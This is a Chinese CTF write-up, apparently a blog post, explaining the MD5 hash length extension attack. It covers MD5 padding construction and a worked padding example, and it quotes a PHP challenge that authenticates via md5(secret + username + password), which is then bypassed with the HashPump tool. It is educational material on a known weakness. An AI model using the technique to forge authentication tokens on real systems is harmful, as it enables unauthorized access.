部位(补bit和补长度)判断len(str) % 512 = 448 ,如果不是的话,就对它进行部位,例如test为四个字节,要让条件成立的话,就必须补(448-4*8)个bit,首先补一个二进制位上的一个1,接着在后面补0.然后补剩下的64bit的长度,这个长度就是字符串的长度,如果超出64位,就取低64位例如补完一个块可能是这样的: Str + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; 其中算法的补位这部分,就是实现长度扩展攻击的关键,所以部位肯定是可控的 攻击原理:构造部位: 假如有一个下载文件的题目,已知字符串 ‘secret+test.pdf’的hash值,secret的长度为10,要求你下载这个网站的其它文件 实现攻击的第一步,将secret+test.pdf补足到64字节 Len(secret) + len(&quot;test.pdf&quot;) + len(padding) + 8 = 64 可以计算出padding的长度为64-8-10-8=38 先补一个二进制位上的1即”\\x80” 和37个0即”\\x00”37,于是变成了这样: Secret + &quot;test.pdf&quot; + &quot;\\x80&quot; + &quot;\\x00&quot;*37 + 8 再补后面的8个字节,这8个字节的内容是len(secret+test.pdf)即18(144位),换算成16进制就是\\x90 + 7个二进制位上的0 所以变成: Secret + &quot;test.pdf&quot; + &quot;\\x80&quot; + &quot;\\x00&quot;*37 + &quot;\\x90\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; ​ 构造hash:用工具爆破即可 所以:构造补位就是为了不用计算第一块的值,只需要计算第二块或者第二块以后的值,而初始值就是原来的hash(这个知道就行了),然后用构造的字符串计算出新的hash 题目主要源码: if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } }绕过条件:username=admin password!=admin $COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))用脚本爆破是不可能的,因为我尝试过了所以用到了hash长度扩展攻击,条件符合直接上HashPump脚本","permalink":"http://perthinking.xyz/CTF/1/","photos":[]}],"categories":[],"tags":[]}